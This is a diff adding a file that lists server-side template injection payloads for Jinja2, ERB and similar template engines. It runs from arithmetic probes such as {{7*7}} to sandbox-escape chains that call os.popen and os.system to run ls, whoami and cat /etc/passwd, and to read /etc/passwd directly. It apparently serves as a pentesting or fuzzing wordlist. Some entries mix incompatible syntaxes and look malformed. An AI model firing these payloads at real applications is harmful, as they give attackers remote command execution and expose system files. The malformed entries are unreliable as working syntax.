@@ -1,0 +1,50 @@
+{{7*7}}
+{{config}}
+{{self}}
+${7*7}
+${{7*7}}
+<%= 7 * 7 %>
+#{7*7}
+{{7*'7'}}
+{{7*'7'}}
+${{<%7*7%>}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{['cat /etc/passwd']}}
+${{<%'cat /etc/passwd'%>}}
+{{config.__class__.__init__.__globals__}}
+{{'a'.__class__.__mro__[1].__subclasses__()}}
+${{7*'7'}}
+<%= 7*'7' %>
+#{7*'7'}
+{{7*7}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+<% 7*7 %>
+#{7*7}
+{{7*'7'}}
+${7*'7'}
+<%='7'*7%>
+#{'7'*7}
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+{{().__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['popen']('ls').read()}}
+${{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+<% @import os %><%= os.popen('ls').read() %>
+{{().__class__.__mro__[2].__subclasses__()[40]('/etc/passwd', 'r').read()}}
+${{().__class__.__mro__[2].__subclasses__()[40]('/etc/passwd', 'r').read()}}
+<%=@__class__.__mro__[2].__subclasses__()[40]('/etc/passwd', 'r').read()%>
+#{['__class__.__mro__[2].__subclasses__()[40]('/etc/passwd', 'r').read()']}
+{{().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['popen']('whoami').read()}}
+${{().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['popen']('whoami').read()}}
+<%=@__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['popen']('whoami').read()%>
+#{['__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['popen']('whoami').read()']}
+{{().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.os.system('ls')}}
+${{().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.os.system('ls')}}
+<% @import os %><%= os.system('ls') %>
+#{['__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.os.system('ls')']}
+{{().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.os.system('cat /etc/passwd')}}
+${{().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.os.system('cat /etc/passwd')}}
